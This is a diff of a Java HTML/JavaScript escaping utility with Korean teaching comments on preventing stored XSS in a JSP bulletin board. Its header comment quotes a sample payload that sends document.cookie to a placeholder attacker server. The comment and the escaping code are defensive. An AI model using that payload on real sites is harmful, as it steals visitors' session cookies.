@@ -1,17 +1,23 @@
-// 이 파일이 속한 폴더(패키지) 이름. 실제 폴더 경로 util 와 반드시 같아야 한다
 package util;   // 이 파일이 속한 패키지(=폴더) 이름. 실제 폴더 구조와 반드시 같아야 한다
+
 /*
  ================================================================================
    HtmlUtil  -  HTML 특수문자를 무해한 문자로 바꾸는(이스케이프) 도우미
+
    [왜 필요한가 - 저장형 XSS]
      기존 board/read.jsp 는 DB에서 꺼낸 값을 그대로 화면에 찍었다.
+
          <input type="text" value="<%=title%>">
          <textarea><%=content%></textarea>
+
      누군가 글 제목을 이렇게 저장하면?
+
          "><script>location.href='http://공격자서버/?c='+document.cookie</script>
+
      value 속성이 끊기면서 <script>가 실제 코드로 실행된다.
      그 글을 읽은 모든 사람의 세션 쿠키가 공격자에게 전송된다.
      한 번 저장되면 계속 발동하므로 "저장형(Stored) XSS"라고 부른다.
+
    [원칙]
      - JSP에서는 <c:out value="${...}"/> 를 사용한다 (JSTL이 자동 이스케이프).
      - 스크립트릿(<% %>)이나 자바 코드에서 문자열을 만들 때는 이 클래스를 쓴다.
@@ -19,14 +25,17 @@ package util;   // 이 파일이 속한 패키지(=폴더) 이름. 실제 폴더
        (입력 필터링은 우회 방법이 많고, 정상 데이터를 훼손한다)
  ================================================================================
 */
+
 // 이 클래스는 "도구 상자" 다. 상태(멤버변수)를 갖지 않고 기능(메소드)만 제공한다.
 // 그래서 아래 메소드가 전부 static 이고, 객체를 만들 필요 없이 HtmlUtil.escape(...) 로 바로 쓴다.
 public class HtmlUtil {
+
 	// 생성자를 private 로 막아 둔다.
 	//   -> 바깥에서 new HtmlUtil() 을 못 한다는 뜻이다.
 	// 왜 막는가? 이 클래스는 객체를 만들 이유가 전혀 없는 도구 모음이기 때문이다.
 	// 막아 두지 않으면 누군가 습관적으로 new 를 해서 쓸모없는 객체를 만든다.
 	private HtmlUtil() {}
+
 	/**
 	 * HTML 컨텍스트에서 위험한 5개 문자를 엔티티로 변환한다.
 	 *   &  ->  &amp;   (가장 먼저 바꿔야 한다. 나중에 바꾸면 이미 만든 엔티티가 깨진다)
@@ -56,13 +65,9 @@ public class HtmlUtil {
 			switch (c) {
 				// & 는 엔티티의 시작 문자라 가장 먼저 바꿔야 한다(위 설명 참고).
 				case '&':  sb.append("&amp;");  break;   // break = 여기서 switch 를 빠져나간다
-				// 주소 뒤가 < 일 때 실행할 갈래
 				case '<':  sb.append("&lt;");   break;   // 태그 시작을 막는다 -> <script> 가 글자로만 보인다
-				// 주소 뒤가 > 일 때 실행할 갈래
 				case '>':  sb.append("&gt;");   break;   // 태그 끝을 막는다
-				// 주소 뒤가 " 일 때 실행할 갈래
 				case '"':  sb.append("&quot;"); break;   // 큰따옴표로 감싼 속성값을 빠져나가지 못하게
-				// 주소 뒤가 \ 일 때 실행할 갈래
 				case '\'': sb.append("&#39;");  break;   // 홑따옴표로 감싼 속성값도 마찬가지. \' 는 홑따옴표 한 글자다
 				// 위 5개가 아닌 평범한 글자는 그대로 붙인다.
 				default:   sb.append(c);
@@ -71,6 +76,7 @@ public class HtmlUtil {
 		// 다 이어 붙인 결과를 String 으로 바꿔 돌려준다.
 		return sb.toString();
 	}
+
 	/**
 	 * 이스케이프한 뒤 줄바꿈만 <br>로 살린다.
 	 *
@@ -84,7 +90,6 @@ public class HtmlUtil {
 	public static String escapeWithBr(String text) {
 		// null 이면 빈 문자열로 (위 escape 와 같은 이유)
 		if (text == null) {
-			// 결과 "" 를 불러준 쪽에 돌려준다
 			return "";
 		}
 		// 순서가 중요하다. 먼저 escape 로 태그를 전부 무력화한 뒤,
@@ -93,6 +98,7 @@ public class HtmlUtil {
 				.replace("\r\n", "<br>")   // 윈도우 줄바꿈(\r\n)을 줄바꿈 태그로
 				.replace("\n", "<br>");    // 리눅스/맥 줄바꿈(\n)도 줄바꿈 태그로
 	}
+
 	/**
 	 * 자바스크립트 문자열 리터럴 안에 값을 넣을 때 사용.
 	 * 예) out.print(" alert('" + HtmlUtil.escapeJs(msg) + "'); ");
@@ -103,7 +109,6 @@ public class HtmlUtil {
 	public static String escapeJs(String text) {
 		// null 이면 빈 문자열로
 		if (text == null) {
-			// 결과 "" 를 불러준 쪽에 돌려준다
 			return "";
 		}
 		// 글자를 하나씩 검사해 이어 붙일 준비 (escape 와 같은 방식)
@@ -116,15 +121,10 @@ public class HtmlUtil {
 			switch (c) {
 				// 역슬래시 자체를 두 개로 만든다. 이걸 먼저 안 하면 아래 처리들이 다 깨진다.
 				case '\\': sb.append("\\\\"); break;
-				// 주소 뒤가 \ 일 때 실행할 갈래
 				case '\'': sb.append("\\'");  break;   // 홑따옴표 -> 문자열을 끊지 못하게 앞에 \ 를 붙인다
-				// 주소 뒤가 " 일 때 실행할 갈래
 				case '"':  sb.append("\\\""); break;   // 큰따옴표도 같은 이유
-				// 주소 뒤가 \r 일 때 실행할 갈래
 				case '\r': sb.append("\\r");  break;   // 진짜 줄바꿈이 들어가면 스크립트 한 줄이 끊긴다
-				// 주소 뒤가 \n 일 때 실행할 갈래
 				case '\n': sb.append("\\n");  break;   // 그래서 "글자 \n" 형태로 바꿔 넣는다
-				// 주소 뒤가 < 일 때 실행할 갈래
 				case '<':  sb.append("\\u003c"); break; // </script> 조기 종료 방지
 				                                        // < 는 < 와 같은 글자를 유니코드 번호로 적은 것이다.
 				                                        // 자바스크립트에는 < 로 읽히지만 HTML 파서는 태그로 못 알아본다.
